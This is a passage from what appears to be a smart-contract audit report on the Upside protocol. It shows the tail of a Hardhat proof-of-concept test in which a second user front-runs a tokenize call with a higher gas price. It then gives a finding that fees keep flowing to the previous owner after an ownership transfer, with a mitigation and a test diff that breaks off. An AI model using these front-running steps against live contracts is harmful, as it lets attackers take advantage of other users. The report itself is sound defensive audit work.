});\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// User2 submits the same transcation with higher gas price to front-run\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser2Tx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eupsideProtocol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etokenize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eurl1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidityTokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egasPrice:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;100\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;gwei\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// High priority\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Mine the transactions, user2\u0026#39;s should be prioritized\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enetwork\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprovider\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;evm_mine\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Reactivate auto-mining for normal operation\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enetwork\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprovider\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;evm_setAutomine\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, [\u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Verify that user1\u0026#39;s transaction failed because the URL was already tokenized\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1Tx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ewait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003erevertedWithCustomError\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eupsideProtocol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;MetaCoinExists\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  }).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etimeout\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100000000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch2 id=\"02-transferring-ownership-may-result-in-fees-being-unintentionally-paid-to-the-previous-owner\" style=\"position:relative;\"\u003e\u003ca href=\"#02-transferring-ownership-may-result-in-fees-being-unintentionally-paid-to-the-previous-owner\" aria-label=\"02 transferring ownership may result in fees being unintentionally paid to the previous owner permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[02] Transferring ownership may result in fees being unintentionally paid to the previous owner\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L337-L353\"\u003ehttps://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L337-L353\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact\" aria-label=\"finding description and impact permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eIn the protocol, the \u003ccode\u003etokenizeFeeDestinationAddress\u003c/code\u003e is a configurable parameter that determines where tokenization fees are sent when the fee system is enabled. This address is set by the \u003ccode\u003eowner\u003c/code\u003e of the contract using a function \u003ccode\u003esetFeeInfo\u003c/code\u003e.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ( \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeDeployerBp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ||\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeDecayBp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ||\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeFinalBp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e || \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeStartingBp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ||\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeSellBp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ||\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e\u0026gt;\u0026gt;          \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenizeFeeDestinationAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) ||\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeStartingBp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeFinalBp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e || \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeDecayInterval\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eInvalidSetting\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eFeeInfoSet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eHowever, when ownership of the contract is transferred using the standard \u003ccode\u003eOwnable\u003c/code\u003e pattern (e.g., via \u003ccode\u003etransferOwnership()\u003c/code\u003e), the \u003ccode\u003etokenizeFeeDestinationAddress\u003c/code\u003e does not automatically update to reflect the new owner. As a result, all tokenization fees continue being sent to the previous owner, even though they no longer control the contract. This creates a temporal vulnerability between the point of ownership transfer and the point at which the new owner explicitly updates the fee configuration. If the new owner delays or forgets to call \u003ccode\u003esetFeeInfo\u003c/code\u003e, then fees are still sent to the previous owner.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eOverride the \u003ccode\u003etransferOwnership()\u003c/code\u003e from \u003ccode\u003eOwnable\u003c/code\u003e to check that if the current fee recipient is the owner trying to exit, then it should revert.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-1\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of concept\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eIn \u003ccode\u003ePoC.test.ts\u003c/code\u003e, make the following modification:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"5\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import { HardhatEthersSigner } from \u0026quot;@nomicfoundation/hardhat-ethers/signers\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import { ethers as hhethers } from \u0026quot;hardhat\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import {IERC20Metadata, UpsideMetaCoin, UpsideProtocol, UpsideStakingStub} from \u0026quot;../types\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   import { expect } from \u0026quot;chai\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    describe(\u0026quot;C4 PoC Test Suite\u0026quot;, function () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ---snip---\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        let user1: HardhatEthersSigner;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+       let user2: HardhatEthersSigner;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ---snip---\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        before(async function () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            signers = await hhethers.getSigners();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            owner = signers[2];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            user1 = signers[0];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+           user2 = signers[1];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            ---snip---\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+       // the test below goes here\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003eAdd the following test in the same file:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"6\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  it(\u0026quot;should send fees to original owner\u0026quot;, async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const url1 = \u0026quot;https://openzeppelin.com\u0026quot;;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const url2 = \u0026quot;https://cantina.com\u0026quot;;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const liquidityTokenAddress = await liquidityToken.getAddress();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const tokenizeFeeDestinationAddress = await owner.getAddress();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const _mintAmount = hhethers.parseUnits(\u0026quot;100\u0026quot;, 6);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const _feeAmount = hhethers.parseUnits(\u0026quot;5\u0026quot;, 6);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Configure fee parameters with current owner as the fee destination\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const newFeeInfo = {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e     